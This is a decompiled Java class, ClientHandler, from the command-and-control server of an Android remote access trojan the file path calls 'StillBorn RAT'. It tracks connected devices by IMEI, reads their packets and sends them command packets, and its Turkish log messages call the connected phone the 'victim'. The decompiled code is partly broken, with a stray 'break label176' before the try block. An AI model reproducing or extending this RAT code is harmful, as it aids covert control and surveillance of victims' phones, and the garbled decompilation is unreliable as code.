/*   1:    */ package server;
/*   2:    */ 
/*   3:    */ import Packet.CommandPacket;
/*   4:    */ import Packet.Packet;
/*   5:    */ import gui.GUI;
/*   6:    */ import in.Demux;
/*   7:    */ import in.Receiver;
/*   8:    */ import java.io.DataOutputStream;
/*   9:    */ import java.io.IOException;
/*  10:    */ import java.net.Socket;
/*  11:    */ import java.nio.ByteBuffer;
/*  12:    */ import out.Mux;
/*  13:    */ 
/*  14:    */ public class ClientHandler
/*  15:    */   extends Thread
/*  16:    */ {
/*  17:    */   private String imei;
/*  18:    */   private Socket clientSocket;
/*  19:    */   private Receiver receiver;
/*  20:    */   private Server server;
/*  21:    */   private Demux demux;
/*  22:    */   private Mux mux;
/*  23:    */   private ByteBuffer buffer;
/*  24:    */   private boolean connected;
/*  25:    */   private GUI mainGUI;
/*  26:    */   
/*  27:    */   public ClientHandler(Socket your_socket, String id, Server s, GUI mainGUI)
/*  28:    */     throws IOException
/*  29:    */   {
/*  30: 51 */     this.mainGUI = mainGUI;
/*  31: 52 */     this.server = s;
/*  32: 53 */     this.imei = id;
/*  33: 54 */     this.clientSocket = your_socket;
/*  34: 55 */     this.receiver = new Receiver(this.clientSocket);
/*  35: 56 */     this.demux = new Demux(this.server, this.imei);
/*  36: 57 */     this.mux = new Mux(new DataOutputStream(this.clientSocket.getOutputStream()));
/*  37: 58 */     this.connected = true;
/*  38: 59 */     this.buffer = ByteBuffer.allocate(2048);
/*  39: 60 */     this.buffer.clear();
/*  40:    */   }
/*  41:    */   
/*  42:    */   public void run()
/*  43:    */   {
/*  44:    */     break label176;
/*  45:    */     try
/*  46:    */     {
/*  47:    */       do
/*  48:    */       {
/*  49: 73 */         this.buffer = this.receiver.read(this.buffer);
/*  50:    */         try
/*  51:    */         {
/*  52: 76 */           if (this.demux.receive(this.buffer)) {
/*  53: 78 */             this.buffer.compact();
/*  54:    */           }
/*  55:    */         }
/*  56:    */         catch (Exception e)
/*  57:    */         {
/*  58: 81 */           this.connected = false;
/*  59:    */           
/*  60:    */ 
/*  61:    */ 
/*  62:    */ 
/*  63:    */ 
/*  64:    */ 
/*  65:    */ 
/*  66:    */ 
/*  67: 90 */           this.server.getGui().logErrTxt("HATA: alınan bilgi çevrilirken hata oluştu (Demux) : " + e.getCause());
/*  68:    */         }
/*  69: 66 */       } while (this.connected);
/*  70:    */     }
/*  71:    */     catch (IOException e)
/*  72:    */     {
/*  73: 95 */       this.connected = false;
/*  74:    */       try
/*  75:    */       {
/*  76: 98 */         this.clientSocket.close();
/*  77: 99 */         this.mainGUI.deleteUser(this.imei);
/*  78:    */       }
/*  79:    */       catch (IOException e1)
/*  80:    */       {
/*  81:101 */         this.server.getGui().logErrTxt("HATA: soketten okurken hata oluştu(Receiver)");
/*  82:    */       }
/*  83:    */     }
/*  84:    */     catch (IndexOutOfBoundsException e)
/*  85:    */     {
/*  86:105 */       this.server.getGui().logErrTxt("Kurban bağlantısı kesildi !");
/*  87:106 */       this.connected = false;
/*  88:    */       try
/*  89:    */       {
/*  90:108 */         this.clientSocket.close();
/*  91:109 */         this.mainGUI.deleteUser(this.imei);
/*  92:    */       }
/*  93:    */       catch (IOException e1)
/*  94:    */       {
/*  95:111 */         this.server.getGui().logErrTxt("Soket kullanıcısı tarafından kapatılmadan önce kapatılamaz");
/*  96:    */       }
/*  97:    */     }
/*  98:    */     label176:
/*  99:115 */     this.server.DeleteClientHandler(this.imei);
/* 100:    */   }
/* 101:    */   
/* 102:    */   public void toMux(short command, int channel, byte[] args)
/* 103:    */   {
/* 104:120 */     Packet packet = new CommandPacket(command, channel, args);
/* 105:121 */     this.mux.send(0, packet.build());
/* 106:    */   }
/* 107:    */   
/* 108:    */   public void updateIMEI(String i)
/* 109:    */   {
/* 110:129 */     this.imei = i;
/* 111:130 */     this.demux.setImei(this.imei);
/* 112:    */   }
/* 113:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     server.ClientHandler
 * JD-Core Version:    0.7.0.1
 */